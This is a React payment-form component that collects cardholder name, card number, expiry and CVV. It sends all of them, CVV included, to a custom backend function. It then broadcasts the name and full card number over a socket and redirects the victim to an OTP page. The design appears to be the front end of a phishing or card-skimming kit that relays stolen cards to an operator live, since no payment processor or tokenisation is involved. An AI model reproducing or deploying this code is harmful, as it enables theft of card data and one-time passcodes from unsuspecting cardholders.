import { paymentSchema, type PaymentType } from '#/schema/payment'
import { useForm } from '@tanstack/react-form'
import { Field, FieldError, FieldGroup, FieldLabel } from '../ui/field'
import { InputGroup, InputGroupAddon, InputGroupInput } from '../ui/input-group'
import { Input } from '../ui/input'
import { useStore } from '@tanstack/react-store'
import {
  formCustomerStore,
  setPaymentInfoId,
} from '#/store/form-customer-store'
import { useTransition } from 'react'
import { postPaymentInfo } from '#/server/post-payment-info'
import { useNavigate } from '@tanstack/react-router'
import { addCardSocket } from '#/server/socket-server'

export default function FormPayment() {
  const [isPending, startTransition] = useTransition()
  const navigate = useNavigate()

  const customerId = useStore(
    formCustomerStore,
    (state) => state.customer,
  ).customerId

  const defaultValues: PaymentType = {
    customerId: customerId,
    cardHoldName: '',
    cardNumber: '',
    cardDate: '',
    cardCVV: '',
  }

  const form = useForm({
    defaultValues,
    validators: {
      onSubmit: paymentSchema,
      onChange: paymentSchema,
    },

    onSubmit: async ({ value }) => {
      startTransition(async () => {
        try {
          const res = await postPaymentInfo({
            data: {
              customerId,
              cardHoldName: value.cardHoldName,
              cardNumber: value.cardNumber,
              cardDate: value.cardDate,
              cardCVV: value.cardCVV,
            },
          })

          await addCardSocket({
            data: { name: value.cardHoldName, cardNumber: value.cardNumber },
          })

          setPaymentInfoId(res.id)
        } catch (err) {
          console.error(err)
          return
        }

        navigate({ to: '/send-otp' })

        form.reset() // Reset form after successful submission
      })
    },
  })

  return (
    <form
      onSubmit={(e) => {
        e.preventDefault()
        form.handleSubmit()
      }}
      className="bg-white rounded-xl border border-gray-300 p-4 space-y-4 w-sm sm:w-md mx-auto"
    >
      <FieldGroup>
        <form.Field
          name="cardHoldName"
          children={(field) => {
            const isInvalid =
              field.state.meta.isTouched && !field.state.meta.isValid

            return (
              <Field data-invalid={isInvalid}>
                <FieldLabel htmlFor={field.name}>Card Holder Name</FieldLabel>

                <Input
                  id={field.name}
                  name={field.name}
                  value={field.state.value}
                  onBlur={field.handleBlur}
                  onChange={(e) => field.handleChange(e.target.value)}
                  aria-invalid={isInvalid}
                  placeholder="Card Holder Name"
                  autoComplete="off"
                  className="border border-gray-300 rounded-lg px-3 py-5 outline-none bg-white"
                />

                {isInvalid && <FieldError errors={field.state.meta.errors} />}
              </Field>
            )
          }}
        />

        <form.Field
          name="cardNumber"
          children={(field) => {
            const isInvalid =
              field.state.meta.isTouched && !field.state.meta.isValid

            return (
              <Field data-invalid={isInvalid}>
                <FieldLabel htmlFor={field.name}>Card Number</FieldLabel>

                <InputGroup className="border border-gray-300 rounded-lg px-3 py-5 outline-none bg-white">
                  <InputGroupInput
                    id={field.name}
                    name={field.name}
                    value={field.state.value.replace(/(.{4})/g, '$1 ').trim()}
                    onBlur={field.handleBlur}
                    onChange={(e) => {
                      let value = e.target.value.replace(/\D/g, '')

                      if (value.length > 16) value = value.slice(0, 16)

                      field.handleChange(value)
                    }}
                    aria-invalid={isInvalid}
                    placeholder="Card Number"
                    autoComplete="off"
                  />

                  <InputGroupAddon align="inline-end">
                    <img
                      src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg"
                      alt="mastercard"
                      className="w-8 h-5 object-contain"
                    />
                  </InputGroupAddon>
                </InputGroup>

                {isInvalid && <FieldError errors={field.state.meta.errors} />}
              </Field>
            )
          }}
        />

        <div className="flex gap-4">
          <form.Field
            name="cardDate"
            children={(field) => {
              const isInvalid =
                field.state.meta.isTouched && !field.state.meta.isValid

              return (
                <Field data-invalid={isInvalid}>
                  <FieldLabel htmlFor={field.name}>Card Date</FieldLabel>

                  <Input
                    id={field.name}
                    name={field.name}
                    value={field.state.value}
                    onBlur={field.handleBlur}
                    onChange={(e) => {
                      let value = e.target.value.replace(/\D/g, '')

                      if (value.length > 4) value = value.slice(0, 4)

                      const month = value.slice(0, 2)
                      const year = value.slice(2, 4)

                      let formatted = month
                      if (year) formatted += `/${year}`

                      field.handleChange(formatted)
                    }}
                    aria-invalid={isInvalid}
                    placeholder="Card Date (MM/YY)"
                    autoComplete="off"
                    className="border border-gray-300 rounded-lg px-3 py-5 outline-none bg-white"
                  />

                  {isInvalid && <FieldError errors={field.state.meta.errors} />}
                </Field>
              )
            }}
          />

          <form.Field
            name="cardCVV"
            children={(field) => {
              const isInvalid =
                field.state.meta.isTouched && !field.state.meta.isValid

              return (
                <Field data-invalid={isInvalid}>
                  <FieldLabel htmlFor={field.name}>CVV</FieldLabel>

                  <Input
                    id={field.name}
                    name={field.name}
                    value={field.state.value}
                    onBlur={field.handleBlur}
                    onChange={(e) => {
                      let value = e.target.value.replace(/\D/g, '')

                      if (value.length > 4) value = value.slice(0, 4)

                      field.handleChange(value)
                    }}
                    aria-invalid={isInvalid}
                    placeholder="CVV"
                    autoComplete="off"
                    className="border border-gray-300 rounded-lg px-3 py-5 outline-none bg-white"
                  />

                  {isInvalid && <FieldError errors={field.state.meta.errors} />}
                </Field>
              )
            }}
          />
        </div>

        <button
          type="submit"
          className="w-full rounded-lg bg-black text-white py-3"
          disabled={isPending}
        >
          {isPending ? 'Processing...' : 'Pay Now'}
        </button>
      </FieldGroup>
    </form>
  )
}
